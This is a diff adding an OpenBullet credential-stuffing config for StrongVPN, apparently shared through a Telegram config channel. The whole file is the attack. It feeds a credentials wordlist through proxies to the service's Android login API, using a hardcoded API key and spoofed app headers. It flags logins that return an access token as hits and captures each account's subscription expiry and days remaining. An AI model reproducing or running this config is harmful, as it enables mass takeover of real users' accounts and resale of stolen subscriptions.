@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "Strong VPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2025-01-20T17:39:35.6760856-05:00",
+  "AdditionalInfo": "Telegram Channel: T.me/OpenBullet_CFGs",
+  "RequiredPlugins": [],
+  "Author": "Rc0nM4ster",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function guid() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var uuid = guid();
+END SCRIPT -> VARS "uuid"
+
+#Login REQUEST POST "https://v2.colomovers.com/wlapi/v2.1/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"api_key\":\"ZmOLNuJz0VBLh2pS3Ep6v1hv57DOuN4zuI7I4fGr\",\"uuid\":\"<uuid>\",\"client\":\"Android-2.3.3.230720\",\"os\":\"2.3.3.230720\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "X-API-Version: 3.4" 
+  HEADER "User-Agent: Android/strongvpn/2.3.3.230720" 
+  HEADER "X-Client: strongvpn" 
+  HEADER "X-Client-Version: 2.3.3.230720" 
+  HEADER "X-Platform: Android" 
+  HEADER "X-Platform-Version: 28" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Email or password provided is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+#subEndEpoch PARSE "<SOURCE>" JSON "sub_end_epoch" -> VAR "subEndEpoch" 
+
+#CurrentUnixTime FUNCTION CurrentUnixTime -> VAR "uTime" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<subEndEpoch>" LessThan "<uTime>" 
+
+#ExpireDate FUNCTION UnixTimeToDate "yyyy-MM-dd" "<subEndEpoch>" -> CAP "expireDate" 
+
+#DaysLeft FUNCTION Compute "(<subEndEpoch>-<uTime>)/86400" -> VAR "daysLeft" 
+
+#Round FUNCTION Round "<daysLeft>" -> CAP "daysLeft" 
+
